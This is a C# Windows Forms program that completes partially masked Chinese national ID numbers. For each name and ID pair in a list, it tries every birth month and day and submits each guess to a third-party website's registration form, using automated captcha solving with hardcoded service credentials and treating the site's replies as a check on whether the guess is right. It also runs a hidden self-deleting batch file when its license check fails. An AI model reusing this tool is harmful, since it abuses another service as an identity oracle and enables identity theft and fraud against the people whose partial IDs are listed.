using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using myDLL;

namespace 身份补齐验证
{
    public partial class 身份补齐验证 : Form
    {
        public 身份补齐验证()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = openFileDialog1.FileName;
              
            }
        }
        string cookie = "";
        string yzm = "";

        DateTime starttime;
        int successcount = 0;
        int threadcount = 0;
        int allcount = 0;

        int runcount = 0;
        
        List<string> lists = new List<string>();
        public void run()
        {
            successcount = 0;

            StreamReader sr = new StreamReader(textBox1.Text, method.EncodingType.GetTxtType(textBox1.Text));
            //一次性读取完 
            string texts = sr.ReadToEnd();
            string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            sr.Close();  //只关闭流
            sr.Dispose();   //销毁流内存

            allcount=text.Length;



            for (int i = 0; i < text.Length; i++)
            {
                runcount++;
                if (text[i].Trim() == "")
                    continue;
                string[] value = text[i].Split(new string[] { "----" }, StringSplitOptions.None);
                string name = value[0].Trim();
                if(lists.Contains(name))
                {
                    continue;
                }
                
                threadcount++;


                //var t1 = new Thread(() => ic6(text[i]));

                //t1.Start();

                //while (threadcount > numericUpDown1.Value)
                //{
                //    Application.DoEvents();//等待本次加载完毕才执行下次循环.
                //}

                ic6(text[i]);

        }


           
        }




        public void ic6(object o)
        {
            string input=o.ToString();

            try
            {

                bool jixu = false;

                for (int month = 1; month <= 12; month++)
                {
                    if (jixu == true)
                        break;
                    for (int day = 1; day <= 31; day++)
                    {

                        if (textBox3.Text.Length > 1000)
                            textBox3.Text = "";


                        string month2 = month.ToString();
                        if (month < 10)
                        {
                            month2 = "0" + month;
                        }
                        string day2 = day.ToString();
                        if (day < 10)
                        {
                            day2 = "0" + day;
                        }



                        string[] value = input.Split(new string[] { "----" }, StringSplitOptions.None);
                        string name = System.Web.HttpUtility.UrlEncode(value[0].Trim());
                        string card = value[1].Trim().Replace("****", month2 + day2);

                        if (CheckIDCard18(card) == false)
                        {

                            continue;
                        }



                        //MessageBox.Show(card);
                        string zimu = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789";
                        Random rd = new Random(Guid.NewGuid().GetHashCode());
                        string suiji = "";
                        for (int a = 0; a < 10; a++)
                        {
                            int suijizimu = rd.Next(0, 60);
                            suiji = suiji + zimu[suijizimu];
                        }



                        string url = "http://www.iy6.cn/?c=Public&action=toregister";
                        string postdata = "username=" + suiji + "&password=" + suiji + "&pwdconfirm=" + suiji + "&realname=" + name + "&email=943510630%40qq.com&identity_card=" + card + "&verify=" + yzm + "&url=http%3A%2F%2Fwww.iy6.cn%2F";
                        string html = method.PostUrlDefault(url, postdata, cookie);
                        string msg = Regex.Match(html, @"""msg"":""([\s\S]*?)""").Groups[1].Value;
                        string astatus = Regex.Match(html, @"""status"":([\s\S]*?),").Groups[1].Value;

                        if (astatus == "0")
                        {
                            msg = method.Unicode2String(msg);
                            if (msg == "今日注册已达上限")
                            {
                                successcount++;
                                threadcount--;
                                lists.Add(value[0].Trim());
                                System.TimeSpan t = DateTime.Now - starttime;
                                label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;
                                textBox3.Text += value[0] + "----" + card + "----成功"  + "\r\n";


                                FileStream fs1 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\成功.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                                StreamWriter sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
                                sw.WriteLine(value[0] + "----" + card + "----成功");
                                sw.Close();
                                fs1.Close();
                                sw.Dispose();
                                jixu = true;
                                break;
                            }

                            else
                            {

                                System.TimeSpan t = DateTime.Now - starttime;
                                label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;
                                textBox3.Text += value[0] + "----" + card + "----" + msg + "\r\n";
                            }


                           
                        }
                        if (astatus == "1")
                        {
                            successcount++;
                            threadcount--;
                            lists.Add(value[0].Trim());
                            System.TimeSpan t = DateTime.Now - starttime;
                             label4.Text = "运行用时："+t.Hours+"时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;



                            textBox3.Text += value[0] + "----" + card + "----成功" + "\r\n";

                            FileStream fs1 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\成功.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                            StreamWriter sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
                            sw.WriteLine(value[0] + "----" + card + "----成功");
                            sw.Close();
                            fs1.Close();
                            sw.Dispose();

                            jixu = true;
                            break;

                        }








                    }
                }





                if (jixu == false)
                {
                   
                    FileStream fs2 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\失败.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                    StreamWriter sw2 = new StreamWriter(fs2, Encoding.GetEncoding("UTF-8"));
                    sw2.WriteLine(input + "----失败");
                    sw2.Close();
                    fs2.Close();
                    sw2.Dispose();
                }
                threadcount--;

            }
            catch (Exception ex)
            {

                textBox3.Text = ex.ToString();
            }
        }









        #region  程序关闭删除自身
        public static void TestForKillMyself()
        {
            string bat = @"@echo off
                           :tryagain
                           del %1
                           if exist %1 goto tryagain
                           del %0";
            File.WriteAllText("killme.bat", bat);//写bat文件
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "killme.bat";
            psi.Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }
        #endregion
        private void 身份补齐验证_Load(object sender, EventArgs e)
        {
            #region 通用检测

            string html = method.GetUrl("http://www.acaiji.com/index/index/vip.html", "utf-8");

            if (!html.Contains(@"rdj5c"))
            {
                TestForKillMyself();
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }


            #endregion
            method.SetFeatures(11000);
            webBrowser1.ScriptErrorsSuppressed = true;
            webBrowser1.Navigate("http://www.iy6.cn/?c=Public&action=register&url=http%3A%2F%2Fwww.iy6.cn%2F");
        }

        Thread thread;
        private void button2_Click(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            if (textBox1.Text=="")
            {
                MessageBox.Show("请导入文本");
                return; 
            }
            
            starttime=DateTime.Now;
            
            cookie = method.GetCookies("http://www.iy6.cn/?c=Public&action=verify");

            yzm_ttshitu.cookie = cookie;
            yzm=( yzm_ttshitu.shibie("2030017712","123q123q", "http://www.iy6.cn/?c=Public&action=verify"));


            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(run);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            this.textBox3.SelectionStart = this.textBox3.Text.Length;
            this.textBox3.SelectionLength = 0;
            this.textBox3.ScrollToCaret();
           
        }

        private void 身份补齐验证_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult dr = MessageBox.Show("确定要关闭吗？", "关闭", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (dr == DialogResult.OK)
            {
                // Environment.Exit(0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else
            {
                e.Cancel = true;//点取消的代码 
            }
        }


        #region 身份号格式检测

        /// <summary>
        /// 验证身份证号码
        /// </summary>
        /// <param name="Id"></param>
        /// <returns></returns>
        public static bool CheckIDCard(string Id)
        {
            if (Id.Length == 18)
            {
                bool check = CheckIDCard18(Id);
                return check;
            }
            else if (Id.Length == 15)
            {
                bool check = CheckIDCard15(Id);
                return check;
            }
            else
            {
                return false;
            }
        }

        /// <summary>
        /// 验证18位身份证格式
        /// </summary>
        /// <param name="Id"></param>
        /// <returns></returns>
        private static bool CheckIDCard18(string Id)
        {
            long n = 0;
            if (long.TryParse(Id.Remove(17), out n) == false || n < Math.Pow(10, 16) || long.TryParse(Id.Replace('x', '0').Replace('X', '0'), out n) == false)
            {
                return false;//数字验证
            }
            string address = "11x22x35x44x53x12x23x36x45x54x13x31x37x46x61x14x32x41x50x62x15x33x42x51x63x21x34x43x52x64x65x71x81x82x91";
            if (address.IndexOf(Id.Remove(2)) == -1)
            {
                return false;//省份验证
            }
            string birth = Id.Substring(6, 8).Insert(6, "-").Insert(4, "-");
            DateTime time = new DateTime();
            if (DateTime.TryParse(birth, out time) == false)
            {
                return false;//生日验证
            }
            string[] arrVarifyCode = ("1,0,x,9,8,7,6,5,4,3,2").Split(',');
            string[] Wi = ("7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2").Split(',');
            char[] Ai = Id.Remove(17).ToCharArray();
            int sum = 0;
            for (int i = 0; i < 17; i++)
            {
                sum += int.Parse(Wi[i]) * int.Parse(Ai[i].ToString());
            }
            int y = -1;
            Math.DivRem(sum, 11, out y);
            if (arrVarifyCode[y] != Id.Substring(17, 1).ToLower())
            {
                return false;//校验码验证
            }
            return true;//符合GB11643-1999标准
        }

        /// <summary>
        /// 验证15位身份证格式
        /// </summary>
        /// <param name="Id"></param>
        /// <returns></returns>
        private static bool CheckIDCard15(string Id)
        {
            long n = 0;
            if (long.TryParse(Id, out n) == false || n < Math.Pow(10, 14))
            {
                return false;//数字验证
            }
            string address = "11x22x35x44x53x12x23x36x45x54x13x31x37x46x61x14x32x41x50x62x15x33x42x51x63x21x34x43x52x64x65x71x81x82x91";
            if (address.IndexOf(Id.Remove(2)) == -1)
            {
                return false;//省份验证
            }
            string birth = Id.Substring(6, 6).Insert(4, "-").Insert(2, "-");
            DateTime time = new DateTime();
            if (DateTime.TryParse(birth, out time) == false)
            {
                return false;//生日验证
            }
            return true;//符合15位身份证标准
        }


        /// <summary>
        /// 根据身份证号获取生日
        /// </summary>
        /// <param name="IdCard"></param>
        /// <returns></returns>
        public static string GetBrithdayFromIdCard(string IdCard)
        {
            string rtn = "1900-01-01";
            if (IdCard.Length == 15)
            {
                rtn = IdCard.Substring(6, 6).Insert(4, "-").Insert(2, "-");
            }
            else if (IdCard.Length == 18)
            {
                rtn = IdCard.Substring(6, 8).Insert(6, "-").Insert(4, "-");
            }
            return rtn;
        }


        /// <summary>
        /// 根据身份证获取性别
        /// </summary>
        /// <param name="IdCard"></param>
        /// <returns></returns>
        public static string GetSexFromIdCard(string IdCard)
        {
            string rtn;
            string tmp = "";
            if (IdCard.Length == 15)
            {
                tmp = IdCard.Substring(IdCard.Length - 3);
            }
            else if (IdCard.Length == 18)
            {
                tmp = IdCard.Substring(IdCard.Length - 4);
                tmp = tmp.Substring(0, 3);
            }
            int sx = int.Parse(tmp);
            int outNum;
            Math.DivRem(sx, 2, out outNum);
            if (outNum == 0)
            {
                rtn = "女";
            }
            else
            {
                rtn = "男";
            }
            return rtn;
        }

        #endregion
        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show(CheckIDCard18("321321199303012258").ToString());
            MessageBox.Show(CheckIDCard18("321321199303022258").ToString());
            MessageBox.Show(CheckIDCard18("321321199303032258").ToString());
        }
    }
}
